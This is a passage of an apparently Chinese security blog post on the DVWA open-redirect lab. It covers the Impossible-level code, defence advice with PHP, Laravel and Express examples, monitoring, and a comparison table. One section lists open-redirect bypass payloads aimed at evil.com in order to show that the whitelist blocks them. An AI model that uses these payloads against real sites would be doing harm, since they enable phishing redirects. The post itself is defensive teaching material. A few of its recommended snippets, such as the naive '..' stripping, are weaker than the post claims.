format&lt;/pre&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ★★★ 验证协议 ★★★</span></span><br><span class="line">            <span class="variable">$allowed_schemes</span> = [<span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;https&#x27;</span>];</span><br><span class="line">            <span class="variable">$scheme</span> = <span class="variable">$parsed</span>[<span class="string">&#x27;scheme&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>( !<span class="title function_ invoke__">in_array</span>( <span class="variable">$scheme</span>, <span class="variable">$allowed_schemes</span> ) ) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Invalid protocol&lt;/pre&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ★★★ 验证域名 ★★★</span></span><br><span class="line">            <span class="variable">$allowed_domains</span> = [<span class="string">&#x27;www.example.com&#x27;</span>, <span class="string">&#x27;example.com&#x27;</span>];</span><br><span class="line">            <span class="variable">$host</span> = <span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>( !<span class="title function_ invoke__">in_array</span>( <span class="variable">$host</span>, <span class="variable">$allowed_domains</span> ) ) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Invalid domain&lt;/pre&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ★★★ 验证端口（如果有） ★★★</span></span><br><span class="line">            <span class="variable">$port</span> = <span class="variable">$parsed</span>[<span class="string">&#x27;port&#x27;</span>] ?? <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span>( <span class="variable">$port</span> !== <span class="literal">null</span> &amp;&amp; !<span class="title function_ invoke__">in_array</span>( <span class="variable">$port</span>, [<span class="number">80</span>, <span class="number">443</span>] ) ) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Invalid port&lt;/pre&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 所有检查通过，安全重定向 ★★★</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>( <span class="string">&quot;Location: &quot;</span> . <span class="variable">$redirect</span> );</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 改进：不透露白名单信息 ★★★</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Invalid redirect target&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 记录可疑行为 ★★★</span></span><br><span class="line">        <span class="title function_ invoke__">logSecurityEvent</span>(<span class="string">&#x27;Invalid redirect attempt&#x27;</span>, [</span><br><span class="line">            <span class="string">&#x27;user&#x27;</span> =&gt; <span class="title function_ invoke__">dvwaCurrentUser</span>(),</span><br><span class="line">            <span class="string">&#x27;redirect&#x27;</span> =&gt; <span class="variable">$redirect</span>,</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;timestamp&#x27;</span> =&gt; <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>)</span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成新的CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>HTML表单（包含CSRF token）：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php echo $_SESSION[&#x27;session_token&#x27;]; ?&gt;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Select destination:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;success.php&quot;</span>&gt;</span>Success Page<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;dashboard.php&quot;</span>&gt;</span>Dashboard<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;https://www.example.com/success&quot;</span>&gt;</span>External Success<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Go<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="完善的防护机制"><a href="#完善的防护机制" class="headerlink" title="完善的防护机制"></a>完善的防护机制</h3><p><strong>多层防御：</strong></p>
+<ol>
+<li><strong>CSRF Token</strong> - 防止跨站请求伪造</li>
+<li><strong>严格白名单</strong> - 只允许预定义的URL</li>
+<li><strong>完全匹配</strong> - 不是部分匹配</li>
+<li><strong>协议验证</strong> - 只允许http&#x2F;https</li>
+<li><strong>域名验证</strong> - 只允许指定域名</li>
+<li><strong>端口验证</strong> - 只允许标准端口</li>
+<li><strong>审计日志</strong> - 记录所有失败尝试</li>
+<li><strong>不泄露信息</strong> - 错误消息统一</li>
+</ol>
+<p><strong>验证流程：</strong></p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">用户选择重定向目标</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">1.</span> 验证CSRF Token → 无效则拒绝</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">2.</span> 检查是否在白名单中 → 不在则拒绝</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">3.</span> 如果是绝对<span class="built_in">URL</span>：</span><br><span class="line">   <span class="keyword">a</span>. 验证协议 → 不是<span class="keyword">http</span>/<span class="keyword">https</span>则拒绝</span><br><span class="line">   b. 验证域名 → 不在白名单则拒绝</span><br><span class="line">   c. 验证端口 → 非标准端口则拒绝</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">4.</span> 记录重定向日志</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">5.</span> 执行重定向</span><br></pre></td></tr></table></figure>
+
+<h3 id="为什么无法攻破？"><a href="#为什么无法攻破？" class="headerlink" title="为什么无法攻破？"></a>为什么无法攻破？</h3><p><strong>所有攻击都被阻止：</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">攻击1：?<span class="attribute">redirect</span>=https://evil.com</span><br><span class="line">白名单检查 → 不在列表 → 拒绝</span><br><span class="line"></span><br><span class="line">攻击2：?<span class="attribute">redirect</span>=success.php@evil.com</span><br><span class="line">白名单检查 → 完全不匹配 → 拒绝</span><br><span class="line"></span><br><span class="line">攻击3：?<span class="attribute">redirect</span>=https://example.com.evil.com</span><br><span class="line">白名单检查 → 不在列表 → 拒绝</span><br><span class="line"></span><br><span class="line">攻击4：?<span class="attribute">redirect</span>=//evil.com</span><br><span class="line">白名单检查 → 不在列表 → 拒绝</span><br><span class="line"></span><br><span class="line">攻击5：URL编码绕过</span><br><span class="line">白名单检查 → 编码后不匹配 → 拒绝</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键防御点：</strong></p>
+<ol>
+<li><strong>白名单机制</strong> - 默认拒绝，只允许明确列出的URL</li>
+<li><strong>完全匹配</strong> - 不接受任何变体</li>
+<li><strong>多层验证</strong> - 协议、域名、端口都检查</li>
+<li><strong>CSRF防护</strong> - 防止攻击者构造恶意链接</li>
+<li><strong>审计日志</strong> - 记录所有异常</li>
+</ol>
+<hr>
+<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><h3 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h3><h4 id="1-使用白名单（最佳方案）"><a href="#1-使用白名单（最佳方案）" class="headerlink" title="1. 使用白名单（最佳方案）"></a>1. 使用白名单（最佳方案）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义允许的重定向URL</span></span><br><span class="line"><span class="variable">$allowed_redirects</span> = [</span><br><span class="line">    <span class="string">&#x27;/dashboard&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/profile&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/settings&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https://trusted-site.com/page&#x27;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$redirect</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;redirect&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 严格匹配</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$redirect</span>, <span class="variable">$allowed_redirects</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid redirect&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$redirect</span>&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-只允许相对路径"><a href="#2-只允许相对路径" class="headerlink" title="2. 只允许相对路径"></a>2. 只允许相对路径</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只允许站内跳转</span></span><br><span class="line"><span class="variable">$redirect</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;redirect&#x27;</span>] ?? <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 确保是相对路径</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$redirect</span>, <span class="string">&#x27;http&#x27;</span>) !== <span class="literal">false</span> ||</span><br><span class="line">    <span class="title function_ invoke__">strpos</span>(<span class="variable">$redirect</span>, <span class="string">&#x27;//&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Only relative paths allowed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 额外：防止路径遍历</span></span><br><span class="line"><span class="variable">$redirect</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$redirect</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$redirect</span>&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-验证域名"><a href="#3-验证域名" class="headerlink" title="3. 验证域名"></a>3. 验证域名</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAllowedDomain</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$parsed</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$parsed</span> || !<span class="keyword">isset</span>(<span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$allowed_domains</span> = [</span><br><span class="line">        <span class="string">&#x27;example.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;www.example.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;subdomain.example.com&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">in_array</span>(<span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>], <span class="variable">$allowed_domains</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$redirect</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;redirect&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">isAllowedDomain</span>(<span class="variable">$redirect</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid domain&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$redirect</span>&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-使用映射而非直接URL"><a href="#4-使用映射而非直接URL" class="headerlink" title="4. 使用映射而非直接URL"></a>4. 使用映射而非直接URL</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用ID映射到URL</span></span><br><span class="line"><span class="variable">$redirect_map</span> = [</span><br><span class="line">    <span class="string">&#x27;success&#x27;</span> =&gt; <span class="string">&#x27;/success.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dashboard&#x27;</span> =&gt; <span class="string">&#x27;/dashboard.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;profile&#x27;</span> =&gt; <span class="string">&#x27;/user/profile.php&#x27;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$redirect_id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;redirect&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$redirect_map</span>[<span class="variable">$redirect_id</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid redirect ID&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span> . <span class="variable">$redirect_map</span>[<span class="variable">$redirect_id</span>]);</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-添加确认页面"><a href="#5-添加确认页面" class="headerlink" title="5. 添加确认页面"></a>5. 添加确认页面</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 重定向到外部网站前显示警告</span></span><br><span class="line"><span class="variable">$redirect</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;redirect&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">isExternalUrl</span>(<span class="variable">$redirect</span>)) &#123;</span><br><span class="line">    <span class="comment">// 显示确认页面</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;h2&gt;You are leaving our site&lt;/h2&gt;</span><br><span class="line">    &lt;p&gt;You are about to visit: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$redirect</span>); <span class="meta">?&gt;</span>&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;Do you want to <span class="keyword">continue</span>?&lt;/p&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;&lt;?php echo htmlspecialchars(<span class="subst">$redirect</span>); ?&gt;&quot;</span>&gt;Yes, <span class="keyword">continue</span>&lt;/a&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;/&quot;</span>&gt;No, stay here&lt;/a&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$redirect</span>&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="框架层面"><a href="#框架层面" class="headerlink" title="框架层面"></a>框架层面</h3><h4 id="Laravel示例"><a href="#Laravel示例" class="headerlink" title="Laravel示例"></a>Laravel示例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用Laravel的重定向</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/redirect&#x27;</span>, function() &#123;</span><br><span class="line">    <span class="variable">$redirect</span> = <span class="title function_ invoke__">request</span>(<span class="string">&#x27;redirect&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 白名单检查</span></span><br><span class="line">    <span class="variable">$allowed</span> = [</span><br><span class="line">        <span class="title function_ invoke__">route</span>(<span class="string">&#x27;dashboard&#x27;</span>),</span><br><span class="line">        <span class="title function_ invoke__">route</span>(<span class="string">&#x27;profile&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;https://trusted-site.com/page&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$redirect</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">abort</span>(<span class="number">400</span>, <span class="string">&#x27;Invalid redirect&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="variable">$redirect</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或使用intended()方法（Laravel内置安全重定向）</span></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>()-&gt;<span class="title function_ invoke__">intended</span>(<span class="string">&#x27;/dashboard&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="Express-js示例"><a href="#Express-js示例" class="headerlink" title="Express.js示例"></a>Express.js示例</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/redirect&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> redirect = req.<span class="property">query</span>.<span class="property">redirect</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 白名单</span></span><br><span class="line">    <span class="keyword">const</span> allowed = [</span><br><span class="line">        <span class="string">&#x27;/dashboard&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/profile&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;https://trusted-site.com/page&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!allowed.<span class="title function_">includes</span>(redirect)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid redirect&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">redirect</span>(redirect);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="监控层面"><a href="#监控层面" class="headerlink" title="监控层面"></a>监控层面</h3><h4 id="1-记录所有重定向"><a href="#1-记录所有重定向" class="headerlink" title="1. 记录所有重定向"></a>1. 记录所有重定向</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logRedirect</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$target</span>, <span class="variable">$success</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$log</span> = [</span><br><span class="line">        <span class="string">&#x27;timestamp&#x27;</span> =&gt; <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span> =&gt; <span class="variable">$user</span>,</span><br><span class="line">        <span class="string">&#x27;target&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="variable">$success</span>,</span><br><span class="line">        <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(</span><br><span class="line">        <span class="string">&#x27;/var/log/security/redirects.log&#x27;</span>,</span><br><span class="line">        <span class="title function_ invoke__">json_encode</span>(<span class="variable">$log</span>) . <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">        FILE_APPEND</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-检测异常重定向模式"><a href="#2-检测异常重定向模式" class="headerlink" title="2. 检测异常重定向模式"></a>2. 检测异常重定向模式</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检测大量失败的重定向尝试</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">detectRedirectAbuse</span>(<span class="params"><span class="variable">$ip</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$recent_failures</span> = <span class="title function_ invoke__">countRecentFailures</span>(<span class="variable">$ip</span>, <span class="number">300</span>); <span class="comment">// 5分钟</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$recent_failures</span> &gt; <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertSecurity</span>(<span class="string">&quot;Possible open redirect abuse from <span class="subst">$ip</span>&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">blockIP</span>(<span class="variable">$ip</span>, <span class="number">3600</span>); <span class="comment">// 封禁1小时</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h2><table>
+<thead>
+<tr>
+<th>特性</th>
+<th>Low</th>
+<th>Medium</th>
+<th>High</th>
+<th>Impossible</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>URL验证</td>
+<td>❌ 无</td>
+<td>正则包含</td>
+<td>parse_url</td>
+<td>严格白名单</td>
+</tr>
+<tr>
+<td>域名检查</td>
+<td>❌</td>
+<td>弱检查</td>
+<td>白名单</td>
+<td>严格白名单</td>
+</tr>
+<tr>
+<td>协议检查</td>
+<td>❌</td>
+<td>http&#x2F;https</td>
+<td>http&#x2F;https</td>
+<td>http&#x2F;https</td>
+</tr>
+<tr>
+<td>匹配方式</td>
+<td>N&#x2F;A</td>
+<td>包含匹配</td>
+<td>精确匹配</td>
+<td>完全匹配</td>
+</tr>
+<tr>
+<td>CSRF防护</td>
+<td>❌</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>审计日志</td>
+<td>❌</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>攻击难度</td>
+<td>极易</td>
+<td>简单</td>
+<td>中等</td>
+<td>极难</td>
+</tr>
+</tbody></table>
+<hr>
